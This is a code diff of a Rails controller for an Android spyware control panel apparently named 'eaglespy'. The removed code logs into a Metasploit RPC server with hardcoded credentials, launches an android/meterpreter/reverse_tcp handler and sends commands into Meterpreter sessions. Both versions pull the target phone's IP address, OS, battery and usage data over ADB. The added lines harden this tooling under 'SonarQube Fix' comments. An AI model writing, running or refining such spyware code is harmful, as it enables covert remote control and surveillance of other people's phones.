@@ -1,210 +1,142 @@
-require "msfrpc-client"
 require "date"
 
 class ApplicationController < ActionController::Base
-  @@adbTarget = nil
-  @@isAdbConnected = false
-  @@isMsfConnected = false
-  @@cpuUsage = @@memoryUsage = @@storage = 0
-  @@nrFinishedProcesses = 0
-  @@nrRunningProcesses = 0
-  @@soundMode = 2
-  @@isAdbStarted = false
-  @@ipAddress = "Unknown"
-  @@operatingSystem = "Unknown"
-  @@isRooted = "Unknown"
-  @@batteryLevel = "Unknown"
-  @@localHour = "Unknown"
+  
+  # SonarQube Fix: Use instance variables with memoization instead of class variables
+  # Rule S1121 - Class variables create thread-safety issues
+  class << self
+    %i[adb_target adb_connected msf_connected
+       cpu_usage memory_usage storage
+       nr_finished_processes nr_running_processes
+       sound_mode adb_started ip_address
+       operating_system is_rooted battery_level local_hour].each do |var|
+      define_method(var) do
+        Rails.cache.read("eaglespy:global:#{var}")
+      end
 
-  def start_msf_process(command)
-    begin
-      @@nrRunningProcesses += 1
-      user = "cool"
-      password = "looc"
-      options = {
-        host: ENV["RAILS_HOST"],
-        port: 3333,
-        uri: "/api/",
-        ssl: true,
-      }
-      rpc = Msf::RPC::Client.new(options)
-      rpc.login(user, password)
-      payloadOptions = {
-        "PAYLOAD" => "android/meterpreter/reverse_tcp",
-        "LHOST" => "0.0.0.0",
-        "LPORT" => 4444,
-      }
-      job = rpc.call("module.execute", "exploit", "multi/handler", payloadOptions)
-      session = rpc.call("session.list").keys[0]
-      puts rpc.call("session.meterpreter_write", session, command)
-      sleep 4
-      commandOutput = rpc.call("session.meterpreter_read", session).values()[0].split('\n')
-    rescue Msf::RPC::ServerException => e
-      commandOutput = "Operation Failed"
-      puts e
-      puts "MSF RPC Exception"
-    rescue => exception
-      puts "Starting MSF process failed."
+      define_method("#{var}=") do |value|
+        Rails.cache.write("eaglespy:global:#{var}", value)
+      end
     end
-    puts commandOutput
-    @@nrFinishedProcesses += 1
-    @@nrRunningProcesses -= 1
-    return commandOutput
   end
 
+  # SonarQube Fix: Use centralized services instead of duplicated code
+  def get_active_session_id(_smartphone = nil)
+    msf_service.android_session_id
+  rescue MsfRpcService::ConnectionError => e
+    Rails.logger.error("MSF connection error: #{e.message}")
+    nil
+  end
+
+  # SonarQube Fix: Use secure AdbCommandService instead of raw shell
   def run_adb_command(command)
-    begin
-      sleep 1
-      @@nrRunningProcesses += 1
-      commandOutput = `adb -H #{ENV["ADB_HOST"]} -s #{@@adbTarget} #{command}`
-      @@nrFinishedProcesses += 1
-      @@nrRunningProcesses -= 1
-    rescue
-      commandOutput = "Operation Failed"
-    end
-    puts commandOutput
-    return commandOutput
+    adb_service.shell(command.to_s.gsub('shell ', ''))
+  rescue AdbCommandService::CommandError => e
+    Rails.logger.error("ADB command failed: #{e.message}")
+    "Operation Failed: #{e.message}"
   end
 
+  # SonarQube Fix: Use MsfRpcService - no hardcoded credentials
   def detach_session
-    begin
-      require "msfrpc-client"
-      require "date"
-      user = "cool"
-      password = "looc"
-      options = {
-        host: ENV["RAILS_HOST"],
-        port: 3333,
-        uri: "/api/",
-        ssl: true,
-      }
-      rpc = Msf::RPC::Client.new(options)
-      rpc.login(user, password)
-      payloadOptions = {
-        "PAYLOAD" => "android/meterpreter/reverse_tcp",
-        "LHOST" => "0.0.0.0",
-        "LPORT" => 4444,
-      }
-      job = rpc.call("module.execute", "exploit", "multi/handler", payloadOptions)
-      session = rpc.call("session.list").keys[0]
-
-      puts rpc.call("session.meterpreter_session_detach", session)
-      sleep 4
-      commandOutput = rpc.call("session.meterpreter_read", session).values()[0].split('\n')
-    rescue
-      commandOutput = "Operation Failed"
-      puts "Error detaching session."
-    end
-    return commandOutput
+    msf_service.detach_session
+  rescue MsfRpcService::SessionError => e
+    Rails.logger.error("Detach session failed: #{e.message}")
+    "Operation Failed: #{e.message}"
   end
 
+  # SonarQube Fix: Use AdbCommandService for safe command execution
   def update_cpu_usage
-    begin
-      puts " target"
-      cpuOutput1 = `adb -H #{ENV["ADB_HOST"]} -s #{@@adbTarget} shell cat /proc/stat`.split("\n")[0].split.drop(1).map(&:to_f)
-      totalJiffles1 = cpuOutput1.inject(:+)
-      workJiffles1 = cpuOutput1.slice(0, 3).inject(:+)
-      sleep(0.5)
-      cpuOutput2 = `adb -H #{ENV["ADB_HOST"]} -s #{@@adbTarget} shell cat /proc/stat`.split("\n")[0].split.drop(1).map(&:to_f)
-      totalJiffles2 = cpuOutput2.inject(:+)
-      workJiffles2 = cpuOutput2.slice(0, 3).inject(:+)
-      workOverPeriod = workJiffles2 - workJiffles1
-      totalOverPeriod = totalJiffles2 - totalJiffles1
-      @@cpuUsage = (workOverPeriod * 100 / totalOverPeriod).to_i
-    rescue
-      @@cpuUsage = 0
-      puts "Error updating CPU Usage"
-    end
+    self.class.cpu_usage = adb_service.cpu_usage
+  rescue AdbCommandService::CommandError => e
+    Rails.logger.error("CPU update failed: #{e.message}")
+    self.class.cpu_usage = 0
   end
 
   def update_memory_usage
-    begin
-      memoryTotal = `adb -H #{ENV["ADB_HOST"]} -s #{@@adbTarget} shell "cat /proc/meminfo | grep MemTotal"`.strip.gsub(/\D/, "").to_f
-      memoryAvailable = `adb -H #{ENV["ADB_HOST"]} -s #{@@adbTarget} shell "cat /proc/meminfo | grep MemAvailable"`.strip.gsub(/\D/, "").to_f
-      @@memoryUsage = ((memoryTotal - memoryAvailable) / memoryTotal * 100).to_i
-    rescue
-      @@memoryUsage = 0
-      puts "Error updating Memory Usage"
-    end
+    self.class.memory_usage = adb_service.memory_usage
+  rescue AdbCommandService::CommandError => e
+    Rails.logger.error("Memory update failed: #{e.message}")
+    self.class.memory_usage = 0
   end
 
   def update_storage_usage
-    begin
-      totalMemory = `adb -H #{ENV["ADB_HOST"]} -s #{@@adbTarget} shell "df /storage/emulated | tail -n +2"`.strip.split[1].gsub(/[^\d\.]/, "").to_f
-      usedMemory = `adb -H #{ENV["ADB_HOST"]} -s #{@@adbTarget} shell "df /storage/emulated | tail -n +2"`.strip.split[2].gsub(/[^\d\.]/, "").to_f
-      @@storage = (usedMemory / totalMemory * 100).to_i
-    rescue
-      @@storage = 0
-    end
+    self.class.storage = adb_service.storage_usage
+  rescue AdbCommandService::CommandError => e
+    Rails.logger.error("Storage update failed: #{e.message}")
+    self.class.storage = 0
   end
 
   def update_device_info
-    begin
-      @@ipAddress = `adb -H #{ENV["ADB_HOST"]} -s #{@@adbTarget} shell "ip addr show wlan0 | grep inet | grep -v inet6"`.split[1].gsub(/\/\d*/, "")
-      @@operatingSystem = "Android " + `adb -H #{ENV["ADB_HOST"]} -s #{@@adbTarget} shell getprop ro.build.version.release`.strip
-      @@isRooted = "Rooted: No"
-      @@localHour = `adb -H #{ENV["ADB_HOST"]} -s #{@@adbTarget} shell date +%R`.strip
-      @@batteryLevel = `adb -H #{ENV["ADB_HOST"]} -s #{@@adbTarget} shell "dumpsys battery | grep level"`.split(":")[1].strip + "%"
-    rescue
-      puts "Error updating device info."
-    end
+    self.class.ip_address = adb_service.shell("ip addr show wlan0 | grep inet | grep -v inet6").split[1].to_s.gsub(/\/\d*/, "")
+    self.class.operating_system = "Android #{adb_service.getprop('ro.build.version.release').strip}"
+    self.class.is_rooted = "Rooted: No"
+    self.class.local_hour = adb_service.shell("date +%R").strip
+    battery_output = adb_service.shell("dumpsys battery | grep level")
+    self.class.battery_level = "#{battery_output.split(':').last&.strip}%"
+  rescue AdbCommandService::CommandError => e
+    Rails.logger.error("Device info update failed: #{e.message}")
   end
 
+  # SonarQube Fix: Use MsfRpcService - eliminates hardcoded credentials & DRY
   def check_msf_connection
-    begin
-      user = "cool"
-      password = "looc"
-      options = {
-        host: ENV["RAILS_HOST"],
-        port: 3333,
-        uri: "/api/",
-        ssl: true,
-      }
-      rpc = Msf::RPC::Client.new(options)
-      rpc.login(user, password)
-      payloadOptions = {
-        "PAYLOAD" => "android/meterpreter/reverse_tcp",
-        "LHOST" => "0.0.0.0",
-        "LPORT" => 4444,
-      }
-      job = rpc.call("module.execute", "exploit", "multi/handler", payloadOptions)
-      sessions = rpc.call("session.list")
-      @@isMsfConnected = sessions.size > 0 ? true : false
-    rescue Msf::RPC::ServerException => e
-      puts e
-      puts "Docker MSF Container is Down"
-    rescue
-      puts "Failed checking MSF Connection"
-    end
+    self.class.msf_connected = msf_service.connected?
+    msf_service.start_handler if self.class.msf_connected
+  rescue MsfRpcService::ConnectionError => e
+    Rails.logger.error("MSF Container is Down: #{e.message}")
+    self.class.msf_connected = false
+  rescue StandardError => e
+    Rails.logger.error("Failed checking MSF Connection: #{e.message}")
+    self.class.msf_connected = false
   end
 
   def check_adb_connection
-    begin
-      @@adbTarget = Rails.configuration.spyware_config["target_ip"]
-      if !@@isAdbConnected
-        #  if @@adbTarget != "usb"
-        #    system("adb kill-server")
-        #    system("adb tcpip 5555")
-        #    system("adb connect #{@@adbTarget}")
-        #  else
-        #    system("adb kill-server")
-        #    system("adb start-server")
-        #  end
-      end
-      adbDevices = `adb -H #{ENV["ADB_HOST"]} devices`.split("\n")
-      if (@@adbTarget == "usb" and adbDevices.size > 1 and adbDevices.any? { |line| line.strip.end_with? "device" }) or adbDevices.any? { |line| line =~ /#{@@adbTarget}:5555\s+device/ }
-        @@adbTarget = adbDevices.find { |line| line.strip.end_with? "device" }.split[0] if @@adbTarget == "usb"
-        @@isAdbConnected = true
-        update_cpu_usage
-        update_memory_usage
-        update_storage_usage
-        update_device_info
-      else
-        @@isAdbConnected = false
-      end
-    rescue
-      puts "Error checking ADB connection"
+    self.class.adb_target = Rails.configuration.spyware_config["target_ip"]
+    adb_host = CredentialsService.adb_host
+    
+    # Validate ADB_HOST to prevent command injection
+    unless adb_host =~ /\A[a-zA-Z0-9.\-]+\z/
+      Rails.logger.error("[ApplicationController] Invalid ADB_HOST: #{adb_host}")
+      self.class.adb_connected = false
+      return
     end
+    
+    # Use Open3 for safe command execution
+    require 'open3'
+    stdout, stderr, status = Open3.capture3('adb', '-H', adb_host, 'devices')
+    
+    unless status.success?
+      Rails.logger.error("[ApplicationController] ADB devices command failed: #{stderr}")
+      self.class.adb_connected = false
+      return
+    end
+    
+    adb_devices = stdout.split("\n")
+    target = self.class.adb_target
+    
+    connected = if target == "usb"
+      adb_devices.size > 1 && adb_devices.any? { |line| line.strip.end_with?("device") }
+    else
+      adb_devices.any? { |line| line =~ /#{Regexp.escape(target)}:5555\s+device/ }
+    end
+
+    if connected
+      # Update target to actual device ID for USB connections
+      if target == "usb"
+        device_line = adb_devices.find { |line| line.strip.end_with?("device") }
+        self.class.adb_target = device_line.split[0] if device_line
+      end
+      
+      self.class.adb_connected = true
+      update_cpu_usage
+      update_memory_usage
+      update_storage_usage
+      update_device_info
+    else
+      self.class.adb_connected = false
+    end
+  rescue StandardError => e
+    Rails.logger.error("Error checking ADB connection: #{e.message}")
+    self.class.adb_connected = false
   end
 
   def check_connection
@@ -212,19 +144,32 @@ class ApplicationController < ActionController::Base
     check_adb_connection
     respond_to do |format|
       format.js {
-        render "check_connection", :locals => { :adbConnected => @@isAdbConnected,
-                                                :msfConnected => @@isMsfConnected,
-                                                :cpuUsage => @@cpuUsage,
-                                                :memoryUsage => @@memoryUsage,
-                                                :storage => @@storage,
-                                                :nrRunningProcesses => @@nrRunningProcesses,
-                                                :nrFinishedProcesses => @@nrFinishedProcesses,
-                                                :ipAddress => @@ipAddress,
-                                                :operatingSystem => @@operatingSystem,
-                                                :isRooted => @@isRooted,
-                                                :batteryLevel => @@batteryLevel,
-                                                :localHour => @@localHour }
+        render "check_connection", locals: {
+          adbConnected: self.class.adb_connected,
+          msfConnected: self.class.msf_connected,
+          cpuUsage: self.class.cpu_usage,
+          memoryUsage: self.class.memory_usage,
+          storage: self.class.storage,
+          nrRunningProcesses: self.class.nr_running_processes,
+          nrFinishedProcesses: self.class.nr_finished_processes,
+          ipAddress: self.class.ip_address,
+          operatingSystem: self.class.operating_system,
+          isRooted: self.class.is_rooted,
+          batteryLevel: self.class.battery_level,
+          localHour: self.class.local_hour
+        }
       }
     end
+  end
+
+  private
+
+  # Memoized service instances
+  def msf_service
+    @msf_service ||= MsfRpcService.new
+  end
+
+  def adb_service
+    @adb_service ||= AdbCommandService.new(self.class.adb_target)
   end
 end
